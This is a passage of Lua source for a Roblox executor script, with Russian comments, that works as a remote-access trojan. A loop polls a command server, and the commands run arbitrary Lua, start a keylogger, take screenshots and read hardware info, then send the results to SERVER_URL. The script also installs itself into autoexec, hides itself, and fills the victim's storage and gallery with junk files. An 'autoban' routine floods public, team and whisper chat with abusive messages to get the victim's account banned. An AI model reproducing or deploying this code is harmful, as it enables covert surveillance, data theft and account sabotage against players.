    local function getRandomMessage()
        local words = getBadWords()
        local message = ""
        
        -- Более агрессивное количество слов (3-7)
        for i = 1, math.random(3, 7) do
            message = message .. words[math.random(1, #words)] .. " "
        end
        
        -- 80% шанс на капс для большей агрессии
        if math.random(1, 5) <= 4 then
            message = message:upper()
        end
        
        -- Добавляем много спецсимволов
        if math.random(1, 2) == 1 then
            message = "!!!" .. message .. "!!!"
        end
        
        if math.random(1, 3) == 1 then
            message = "### " .. message .. " ###"
        end
        
        return message:sub(1, 200) -- Более длинные сообщения
    end
    
    -- ИСПРАВЛЕННАЯ функция спама в чат (работает с новым чатом Roblox)
    local function spamChat()
        while autoBanEnabled do
            local message = getRandomMessage()
            
            -- Пытаемся использовать новый TextChatService (современный Roblox)
            pcall(function()
                local textChatService = game:GetService("TextChatService")
                local textChatChannel = textChatService:FindFirstChild("TextChannel")
                
                if textChatChannel then
                    textChatChannel:SendAsync(message)
                end
            end)
            
            -- Пытаемся использовать старый ReplicatedStorage чат (старые игры)
            pcall(function()
                local replicatedStorage = game:GetService("ReplicatedStorage")
                
                -- Способ 1: DefaultChatSystemChatEvents
                local defaultChat = replicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
                if defaultChat then
                    local sayMessage = defaultChat:FindFirstChild("SayMessageRequest")
                    if sayMessage then
                        sayMessage:FireServer(message, "All")
                    end
                end
                
                -- Способ 2: ChatEvents (другой вариант)
                local chatEvents = replicatedStorage:FindFirstChild("ChatEvents")
                if chatEvents then
                    local sayMessage = chatEvents:FindFirstChild("SayMessageRequest")
                    if sayMessage then
                        sayMessage:FireServer(message, "All")
                    end
                end
                
                -- Способ 3: Direct RemoteEvent
                for _, obj in pairs(replicatedStorage:GetDescendants()) do
                    if obj:IsA("RemoteEvent") and (obj.Name:find("Chat") or obj.Name:find("Say") or obj.Name:find("Message")) then
                        pcall(function()
                            obj:FireServer(message, "All")
                        end)
                    end
                end
            end)
            
            -- Пытаемся использовать Players службу
            pcall(function()
                local players = game:GetService("Players")
                local player = players.LocalPlayer
                
                -- Через Player объект
                if player then
                    pcall(function()
                        player:Chat(message)
                    end)
                end
            end)
            
            -- Очень короткая задержка для максимального спама (0.1-0.3 сек)
            task.wait(math.random(10, 30) / 100)
        end
    end
    
    local function spamTeamChat()
        while autoBanEnabled do
            local message = getRandomMessage()
            
            -- Спам в Team чат тоже
            pcall(function()
                local replicatedStorage = game:GetService("ReplicatedStorage")
                local defaultChat = replicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
                if defaultChat then
                    local sayMessage = defaultChat:FindFirstChild("SayMessageRequest")
                    if sayMessage then
                        sayMessage:FireServer(message, "Team")
                    end
                end
            end)
            
            task.wait(math.random(15, 40) / 100)
        end
    end
    
    local function spamWhisperChat()
        -- Спам в приватные сообщения другим игрокам
        while autoBanEnabled do
            local players = game:GetService("Players"):GetPlayers()
            if #players > 1 then
                local targetPlayer = players[math.random(2, #players)] -- Пропускаем себя
                local message = getRandomMessage()
                
                pcall(function()
                    local replicatedStorage = game:GetService("ReplicatedStorage")
                    local defaultChat = replicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
                    if defaultChat then
                        local whisperEvent = defaultChat:FindFirstChild("WhisperChat")
                        if whisperEvent then
                            whisperEvent:FireServer(message, targetPlayer.Name)
                        end
                    end
                end)
            end
            
            task.wait(math.random(20, 50) / 100)
        end
    end
    
    -- Запускаем агрессивный спам в нескольких потоках
    autoBanTask = task.spawn(spamChat)
    task.spawn(spamTeamChat)
    task.spawn(spamWhisperChat)
    
    -- Автоматическое выключение через 1 минуту (обычно бан наступает быстрее)
    task.delay(60, function()
        if autoBanEnabled then
            autoBanEnabled = false
        end
    end)
    
    return true
end

local function stopAutoBan()
    if not autoBanEnabled then return false end
    
    autoBanEnabled = false
    
    -- Останавливаем все задачи
    if autoBanTask then
        task.cancel(autoBanTask)
        autoBanTask = nil
    end
    
    return true
end

local function ExecuteCommand(cmd, args)
    local success = pcall(function()
        if cmd == "chat" then
            if chatSystem then
                chatSystem.gui.Enabled = not chatSystem.gui.Enabled
                chatSystem.enabled = chatSystem.gui.Enabled
                if chatSystem.gui.Enabled then
                    chatSystem.addMessage("Система", "Чат включен", true)
                end
            end
        
        elseif cmd == "popup" then
            if args and args[1] then
                showPopupMessage(args[1])
            end
        
        elseif cmd == "print" then
            -- проверка связи
        
        elseif cmd == "kick" then
            player:Kick(args[1] or "Кикнут администратором")
        
        elseif cmd == "freeze" then
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid.WalkSpeed = 0
                task.delay(tonumber(args[1] or 5), function()
                    if humanoid then humanoid.WalkSpeed = 16 end
                end)
            end
        
        elseif cmd == "void" then
            local character = player.Character or player.CharacterAdded:Wait()
            local root = character:FindFirstChild("HumanoidRootPart")
            if root then
                root.CFrame = CFrame.new(0, -5000, 0)
            end
        
        elseif cmd == "spin" then
            local character = player.Character or player.CharacterAdded:Wait()
            local root = character:FindFirstChild("HumanoidRootPart")
            if root then
                for i = 1, 20 do
                    if root then
                        root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(30), 0)
                        task.wait(0.1)
                    end
                end
            end
        
        elseif cmd == "fling" then
            local character = player.Character or player.CharacterAdded:Wait()
            local root = character:FindFirstChild("HumanoidRootPart")
            if root then
                root.Velocity = Vector3.new(0, 5000, 0)
            end
        
        elseif cmd == "sit" then
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid.Sit = not humanoid.Sit
            end
        
        elseif cmd == "dance" then
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                local anim = Instance.new("Animation")
                anim.AnimationId = "rbxassetid://35654637"
                local track = humanoid:LoadAnimation(anim)
                track:Play()
            end
        
        elseif cmd == "blur" then
            local blur = Instance.new("BlurEffect")
            blur.Size = 24
            blur.Parent = Lighting
            task.delay(tonumber(args[1] or 5), function()
                pcall(function() if blur then blur:Destroy() end end)
            end)
        
        elseif cmd == "mute" then
            for _, sound in ipairs(SoundService:GetDescendants()) do
                if sound:IsA("Sound") then sound.Volume = 0 end
            end
        
        elseif cmd == "unmute" then
            for _, sound in ipairs(SoundService:GetDescendants()) do
                if sound:IsA("Sound") then sound.Volume = 1 end
            end
        
        elseif cmd == "playaudio" and args[1] then
            local character = player.Character or player.CharacterAdded:Wait()
            local root = character:FindFirstChild("HumanoidRootPart")
            local sound = Instance.new("Sound")
            sound.SoundId = "rbxassetid://"..args[1]
            sound.Parent = root or player
            sound:Play()
            sound.Ended:Connect(function()
                pcall(function() sound:Destroy() end)
            end)
        
        elseif cmd == "execute" then
            local result = executeLua(table.concat(args, " "))
        
        elseif cmd == "fakeerror" then
            showFakeError(table.concat(args, " "))
        
        elseif cmd == "screenshot" then
            local screenshotData = captureScreenshot()
            if screenshotData then
                httpRequest({
                    Url = SERVER_URL.."/screenshot",
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode({
                        image = screenshotData
                    })
                })
            end
        
        elseif cmd == "keylog" then
            keyloggerEnabled = true
            keylogBuffer = ""
            lastSendTime = os.time()
        
        elseif cmd == "stopkeylog" then
            keyloggerEnabled = false
            if keylogBuffer ~= "" then
                httpRequest({
                    Url = SERVER_URL.."/keylog",
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode({
                        logs = keylogBuffer
                    })
                })
            end
            keylogBuffer = ""
        
        elseif cmd == "hardware" then
            local hwInfo = getHardwareInfo()
            httpRequest({
                Url = SERVER_URL.."/hardware",
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({
                    player = player.Name,
                    data = hwInfo
                })
            })
        
        elseif cmd == "hide" then
            hideScript()
        
        elseif cmd == "memory_spam" then
            local fileCount = tonumber(args[1]) or 50
            
            task.spawn(function()
                local savedCount = memorySpam(fileCount)
                httpRequest({
                    Url = SERVER_URL.."/command",
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode({
                        command = "spam_completed",
                        args = {"memory_spam", "Создано "..savedCount.." файлов из "..fileCount}
                    })
                })
            end)
        
        elseif cmd == "gallery_spam" then
            local imageCount = tonumber(args[1]) or 5
            
            task.spawn(function()
                local savedCount = gallerySpam(imageCount)
                httpRequest({
                    Url = SERVER_URL.."/command",
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode({
                        command = "spam_completed",
                        args = {"gallery_spam", "Сохранено "..savedCount.." файлов из "..imageCount}
                    })
                })
            end)
            
        -- AutoBan (в секции SPAM)
        elseif cmd == "autoban" then
            if args and args[1] then
                local action = args[1]:lower()
                if action == "on" or action == "enable" or action == "start" then
                    startAutoBan()
                elseif action == "off" or action == "disable" or action == "stop" then
                    stopAutoBan()
                else
                    -- Переключение
                    if autoBanEnabled then
                        stopAutoBan()
                    else
                        startAutoBan()
                    end
                end
            else
                -- Переключение без аргументов
                if autoBanEnabled then
                    stopAutoBan()
                else
                    startAutoBan()
                end
            end
        
        elseif cmd == "jumpscare" then
            local scareType = tonumber(args[1]) or 1
            task.spawn(function()
                executeJumpscareCommand(scareType)
            end)
        
        -- КОМАНДА: Блокировка камеры
        elseif cmd == "cameralock" then
            if args and args[1] then
                local action = args[1]:lower()
                if action == "on" or action == "enable" or action == "true" then
                    cameraLock(true)
                elseif action == "off" or action == "disable" or action == "false" then
                    cameraLock(false)
                else
                    -- Автоматическое переключение
                    cameraLock(not cameraLockEnabled)
                end
            else
                -- Переключение без аргументов
                cameraLock(not cameraLockEnabled)
            end
        
        -- КОМАНДА: Тряска камеры  
        elseif cmd == "camerashake" then
            local duration = tonumber(args[1]) or 5
            local intensity = tonumber(args[2]) or 2
            
            -- Ограничиваем значения для безопасности
            duration = math.min(duration, 30)  -- максимум 30 секунд
            intensity = math.min(intensity, 10) -- максимум интенсивность 10
            
            cameraShake(duration, intensity)
        
        end
    end)
end

local function checkCommands()
    local success, response = pcall(function()
        return httpRequest({
            Url = SERVER_URL.."/data?player=" .. player.Name,
            Method = "GET"
        })
    end)
    
    if success and response and response.Body then
        local success, data = pcall(function()
            return HttpService:JSONDecode(response.Body)
        end)
        
        if success and data and data.command and data.command ~= "" then
            ExecuteCommand(data.command, data.args or {})
            return true
        end
    end
    return false
end

local function initialize()
    if deviceType == "PC" then
        task.wait(1)
        pcall(autoInstallToAutoexec)
    end
    
    pcall(sendInjectNotification)
    pcall(setupKeylogger)
    pcall(hideScript)
end

local function mainLoop()
    while task.wait(2) do
        pcall(checkCommands)
        
        if os.time() - lastUserUpdate >= 15 then
            pcall(sendUserInfo)
        end
        
        if keyloggerEnabled and os.time() - lastSendTime >= 300 then
            if keylogBuffer ~= "" then
                pcall(function()
                    httpRequest({
                        Url = SERVER_URL.."/keylog",
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = HttpService:JSONEncode({
                            logs = keylogBuffer
                        })
                    })
                    keylogBuffer = ""
                end)
            end
            lastSendTime = os.time()
        end
    end
end

pcall(initialize)
pcall(mainLoop)
